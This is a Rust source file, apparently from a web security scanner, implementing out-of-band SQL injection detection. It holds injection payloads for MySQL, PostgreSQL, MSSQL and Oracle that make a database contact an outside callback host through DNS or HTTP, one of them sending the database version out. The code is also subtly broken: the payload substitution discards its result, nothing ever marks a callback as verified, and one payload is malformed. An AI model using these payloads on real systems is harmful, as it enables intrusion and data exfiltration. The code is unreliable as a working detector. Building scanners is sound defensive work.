//! Out-of-Band SQL Injection Detection Module
//! Detect OOB SQLi via DNS and HTTP callbacks using unique correlation tokens.

use crate::checks::module::{CheckModule, CheckResult, Severity};
use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::learning::sqli_cache::SqliCache;
use std::collections::HashMap;
use std::time::{Duration, Instant};

/// Maximum pending callbacks to track (bounded memory)
const MAX_PENDING_CALLBACKS: usize = 100;

/// Default timeout for callback verification
const CALLBACK_TIMEOUT_SECS: u64 = 30;

/// Correlation token for OOB detection
#[derive(Debug, Clone)]
pub struct CorrelationToken {
    pub id: String,
    pub dns_token: String,
    pub http_token: String,
    pub created_at: Instant,
    pub verified: bool,
}

/// OOB channel type
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OobChannel {
    Dns,
    Http,
    Smtp,
    Ftp,
}

/// OOB SQLi detector
pub struct OobDetector {
    cache: SqliCache,
    http_client: HttpClient,
    pending_callbacks: HashMap<String, CorrelationToken>,
    callback_timeout: Duration,
    dns_server: String,
    http_callback_url: Option<String>,
}

impl OobDetector {
    /// Create a new OOB detector
    pub fn new(cache: SqliCache, http_client: HttpClient) -> Self {
        Self {
            cache,
            http_client,
            pending_callbacks: HashMap::with_capacity(MAX_PENDING_CALLBACKS),
            callback_timeout: Duration::from_secs(CALLBACK_TIMEOUT_SECS),
            dns_server: "interact.sh".to_string(), // Default public interact server
            http_callback_url: None,
        }
    }

    /// Set custom DNS server for OOB testing
    pub fn set_dns_server(&mut self, server: &str) {
        self.dns_server = server.to_string();
    }

    /// Set HTTP callback URL for OOB testing
    pub fn set_http_callback(&mut self, url: &str) {
        self.http_callback_url = Some(url.to_string());
    }

    /// Generate a unique correlation token
    fn generate_token() -> CorrelationToken {
        use std::time::{SystemTime, UNIX_EPOCH};
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_millis();

        let random_suffix = rand::random::<u32>();
        let id = format!("{}_{}", timestamp, random_suffix);

        CorrelationToken {
            id: id.clone(),
            dns_token: format!("{}{}", id, ".dns.interact.sh"),
            http_token: format!("{}{}", id, ".http.interact.sh"),
            created_at: Instant::now(),
            verified: false,
        }
    }

    /// Generate OOB payloads for different DBMS
    fn generate_oob_payloads(&self, token: &CorrelationToken, param: &str) -> Vec<String> {
        let mut payloads = Vec::new();

        // MySQL - DNS exfiltration
        payloads.push(format!(
            "{}' AND LOAD_FILE(CONCAT('\\\\', '{}', '\\\\a'))-- ",
            param, token.dns_token
        ));

        // MySQL - HTTP exfiltration (requires secure_file_priv)
        if let Some(ref callback) = self.http_callback_url {
            payloads.push(format!(
                "{}' AND SELECT LOAD_FILE(CONCAT('{}', '/', (SELECT version())))-- ",
                param, callback
            ));
        }

        // PostgreSQL - DNS exfiltration via dblink or COPY
        payloads.push(format!(
            "{}'; SELECT pg_read_binary_file('\\\\\\\\{}\\\\file')-- ",
            param, token.dns_token
        ));

        // MSSQL - DNS exfiltration via xp_dirtree
        payloads.push(format!(
            "{}'; EXEC master..xp_dirtree '\\\\{}\\share'-- ",
            param, token.dns_token
        ));

        // MSSQL - HTTP via sp_OACreate
        if let Some(ref callback) = self.http_callback_url {
            payloads.push(format!(
                "{}'; DECLARE @o INT; EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @o; EXEC sp_OAMethod @o, 'open', NULL, 'GET', '{}?data={}'-- ",
                param, callback, token.id
            ));
        }

        // Oracle - HTTP via UTL_HTTP
        if let Some(ref callback) = self.http_callback_url {
            payloads.push(format!(
                "{}'; BEGIN UTL_HTTP.request('{}?data={}' ); END;-- ",
                param, callback, token.id
            ));
        }

        // Generic - Comment-based token injection
        payloads.push(format!(
            "{}' /* {} */ -- ",
            param, token.id
        ));

        payloads
    }

    /// Register a token for callback tracking
    pub fn register_token(&mut self) -> CorrelationToken {
        let token = Self::generate_token();

        // Maintain bounded storage
        if self.pending_callbacks.len() >= MAX_PENDING_CALLBACKS {
            // Remove oldest unverified token
            self.pending_callbacks.retain(|_, t| t.verified);
        }

        let token_id = token.id.clone();
        self.pending_callbacks.insert(token_id.clone(), token);
        
        self.pending_callbacks.get(&token_id).unwrap().clone()
    }

    /// Check if a callback has been received
    pub fn check_callback(&self, token_id: &str) -> bool {
        if let Some(token) = self.pending_callbacks.get(token_id) {
            token.verified
        } else {
            false
        }
    }

    /// Mark a token as verified
    pub fn verify_token(&mut self, token_id: &str) {
        if let Some(token) = self.pending_callbacks.get_mut(token_id) {
            token.verified = true;
        }
    }

    /// Clean up expired tokens
    pub fn cleanup_expired(&mut self) {
        let now = Instant::now();
        self.pending_callbacks.retain(|_, token| {
            now.duration_since(token.created_at) < self.callback_timeout
        });
    }

    /// Detect OOB SQLi
    pub async fn detect(&mut self, request: &HttpRequest) -> Option<CheckResult> {
        self.cleanup_expired();

        let token = self.register_token();
        let payloads = self.generate_oob_payloads(&token, "id");

        for payload in payloads {
            let mut test_request = request.clone();

            // Inject payload
            if let Some(body) = test_request.body_mut() {
                body.replace("id=", &format!("id={}", payload));
            }

            // Execute the request
            match self.http_client.execute(&test_request).await {
                Ok(_) => {
                    // Wait briefly for callback
                    tokio::time::sleep(Duration::from_secs(2)).await;

                    // Check if callback was received
                    if self.check_callback(&token.id) {
                        return Some(CheckResult {
                            module: "oob_sqli".to_string(),
                            severity: Severity::Critical,
                            confidence: 0.95,
                            description: format!(
                                "Out-of-Band SQLi detected via callback. Token: {}",
                                token.id
                            ),
                            evidence: format!("Payload triggered OOB callback: {}", payload),
                            parameter: Some("id".to_string()),
                            remediation: "Disable external network access for database, use WAF".to_string(),
                        });
                    }
                }
                Err(_) => continue,
            }
        }

        None
    }
}

impl CheckModule for OobDetector {
    fn name(&self) -> &'static str {
        "oob_sqli"
    }

    fn severity(&self) -> Severity {
        Severity::Critical
    }

    fn run(&mut self, _request: &HttpRequest) -> Vec<CheckResult> {
        vec![]
    }
}

// Note: Requires rand and tokio crates
// [dependencies]
// rand = "0.8"
// tokio = { version = "1", features = ["time"] }

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_token_generation() {
        let cache = SqliCache::new();
        let client = HttpClient::default();
        let mut detector = OobDetector::new(cache, client);

        let token = detector.register_token();
        assert!(!token.id.is_empty());
        assert!(token.dns_token.contains(&token.id));
    }

    #[test]
    fn test_payload_generation() {
        let cache = SqliCache::new();
        let client = HttpClient::default();
        let detector = OobDetector::new(cache, client);

        let token = CorrelationToken {
            id: "test123".to_string(),
            dns_token: "test123.dns.interact.sh".to_string(),
            http_token: "test123.http.interact.sh".to_string(),
            created_at: Instant::now(),
            verified: false,
        };

        let payloads = detector.generate_oob_payloads(&token, "id");
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("LOAD_FILE")));
        assert!(payloads.iter().any(|p| p.contains("xp_dirtree")));
    }
}
